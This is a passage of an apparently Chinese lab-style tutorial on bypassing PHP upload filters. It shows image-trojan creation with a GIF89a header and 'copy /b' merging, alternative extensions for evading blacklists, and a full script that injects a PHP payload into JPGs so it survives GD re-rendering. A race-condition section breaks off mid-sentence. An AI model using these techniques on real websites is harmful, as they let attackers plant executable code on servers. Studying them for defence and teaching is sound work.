GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回 图像的尺寸 以及 文件类型 及图片 高度 与 宽度</span><br><span class="line">成功返回一个数组，失败则返回 <span class="literal">FALSE</span> 并产生一条 E_WARNING 级的错误信息</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype() 函数</span><br></pre></td></tr></table></figure><p>该函数相当于检验了上传文件的内容，检测其是否真的是一张图片。此时就不能直接上传 php内容 的文件了。</p><h4 id="方法一：制作图片木马"><a href="#方法一：制作图片木马" class="headerlink" title="方法一：制作图片木马"></a>方法一：制作图片木马</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line">phpinfo();</span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">图片合并：</span><br><span class="line">命令：</span><br><span class="line"><span class="keyword">copy</span> <span class="number">1.</span>jpg<span class="operator">/</span>b<span class="operator">+</span>phpinfo.php<span class="operator">/</span>a hack.jpg</span><br><span class="line">以二进制的方式打开，写入文件</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写入到  版权   当中</span><br></pre></td></tr></table></figure><h4 id="方法二：文件幻术–十六进制编辑器"><a href="#方法二：文件幻术–十六进制编辑器" class="headerlink" title="方法二：文件幻术–十六进制编辑器"></a>方法二：文件幻术–十六进制编辑器</h4><p>为了更方便的区别不同文件的类型，相同类型的文件最开头有着相同的字节。<br>| 后缀名 | 文件头                                          |<br>| —— | ———————————————– |<br>| .gif   | 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33 |<br>| .jpg   | FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C |<br>| .png   | 89 50 4E 47 0D 0A 1A 0A 00 00 00 00 49 48 44 52 |</p><p>Hex-&gt;Ascii</p><h4 id="方法三：属性版本-直接加一句话"><a href="#方法三：属性版本-直接加一句话" class="headerlink" title="方法三：属性版本 直接加一句话"></a>方法三：属性版本 直接加一句话</h4><h4 id="方法四：010Editor-直接加一句话"><a href="#方法四：010Editor-直接加一句话" class="headerlink" title="方法四：010Editor 直接加一句话"></a>方法四：010Editor 直接加一句话</h4><p>相当于方法三</p><h3 id="3-后缀名–黑白名单策略"><a href="#3-后缀名–黑白名单策略" class="headerlink" title="3.后缀名–黑白名单策略"></a>3.后缀名–黑白名单策略</h3><p><strong>黑名单：寻找其它可允许上传的类型去绕过限制</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.php .php2 .php3 .php5 .phtml</span><br><span class="line">.asp .aspx .ascx .ashx .asa .cer</span><br><span class="line">.jsp .jspx</span><br></pre></td></tr></table></figure><h3 id="4-二次渲染"><a href="#4-二次渲染" class="headerlink" title="4.二次渲染"></a>4.二次渲染</h3><p><a href="https://xz.aliyun.com/t/2657#toc-13">参考1</a></p><p><a href="https://www.cnblogs.com/forforever/p/13191999.html">参考2</a></p><p>就是将用户上传的图片重新生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">basename() 函数返回路径中的文件名部分</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">输出：</span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imagecreatefromjpeg(filename)：由原文件路径生成一个信心的图像</span><br><span class="line">filename</span><br><span class="line">    JPEG 图像的路径。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool imagejpeg ( resource image [, string filename [, int quality]] ) </span><br><span class="line"></span><br><span class="line">imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像。image 参数是 imagecreatefromjpeg 等函数的返回值。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink(filename,context) :函数删除文件</span><br><span class="line">若成功，则返回 <span class="literal">true</span>，失败则返回 <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="方法一：gif-绕过"><a href="#方法一：gif-绕过" class="headerlink" title="方法一：gif 绕过"></a>方法一：gif 绕过</h4><p>使用 010将gif图片的最后加上一句话，上传之后，将上传之后的图片下载下来，再次打开010查看，发现原本我们写入的一句话已经消失了。</p><p>但与之前的图片进行对照，仍有未经渲染（改变）的部分，我们可以讲一句话写入不会被渲染的部分进行上传即可。</p><p>图片末尾加一句话</p><p><img src="https://i.loli.net/2021/06/06/MjcNfBp7xGenQhm.png" alt="image-20210414185051946"></p><p>经过渲染，一句话消失</p><p><img src="https://i.loli.net/2021/06/06/lNAGfPnQCgqUV6d.png" alt="image-20210414185127873"></p><p>找到未经渲染的部分，加一句话，上传</p><p><img src="https://i.loli.net/2021/06/06/8Bc72KVLROgbHms.png" alt="image-20210414185805640"></p><p>未被渲染掉</p><p><img src="https://i.loli.net/2021/06/06/UTXBRISzfnHOblm.png" alt="image-20210414185908992"></p><h4 id="方法二：png绕过"><a href="#方法二：png绕过" class="headerlink" title="方法二：png绕过"></a>方法二：png绕过</h4><p>png图片由三个以上的数据块组成</p><p>两种类型的数据块：</p><p>1)关键数据块</p><p>2)辅助数据块：PLTE</p><p><strong>方法一：写入IDAT数据块</strong></p><p>1)直接在本地运行脚本，生成1.png图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, </span><br><span class="line">0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, </span><br><span class="line">0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, </span><br><span class="line">0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, </span><br><span class="line">0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, </span><br><span class="line">0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, </span><br><span class="line">0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, </span><br><span class="line">0x66, 0x44, 0x50, 0x33); </span><br><span class="line">$img = imagecreatetruecolor(32, 32); </span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; </span><br><span class="line">$r = $p[$y]; </span><br><span class="line">$g = $p[$y+1]; </span><br><span class="line">$b = $p[$y+2]; </span><br><span class="line">$color = imagecolorallocate($img, $r, $g, $b); </span><br><span class="line">imagesetpixel($img, round($y / 3), 0, $color); </span><br><span class="line">&#125;</span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/WlvA5nmCS8H7ru4.png" alt="image-20210414191820833"></p><p><strong>方法二：写入PLTE数据块</strong></p><h4 id="方法三：jpg绕过"><a href="#方法三：jpg绕过" class="headerlink" title="方法三：jpg绕过"></a>方法三：jpg绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先找一张jpg上传，将上传的图片进行下载，kali运行脚本</p><blockquote><p>php ben.php 21044.jpg</p></blockquote><p><img src="https://i.loli.net/2021/06/06/lgyOxavE5J9VbrW.png" alt="image-20210414193225272"></p><p>010打开查看</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210414193438953.png" alt="image-20210414193438953"></p><p>写入成功</p><h3 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5.条件竞争"></a>5.条件竞争</h3><p>示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>之前都是，首先判断 我们上传的文件 是否 符合白名单，或者是不在黑名单当中；只有当条件符合时，才会使用 <code>move_uploaded_file($temp_file, $upload_file)</code> 将我们上传的文件进行路径移动。</p><p>而本题时首先将我们上传的文件进行路径移动，然后再判断是否符合白名单，如果不符合的话，就会使用 <code>unlink($upload_file);</code> 将我们上传的文件进行 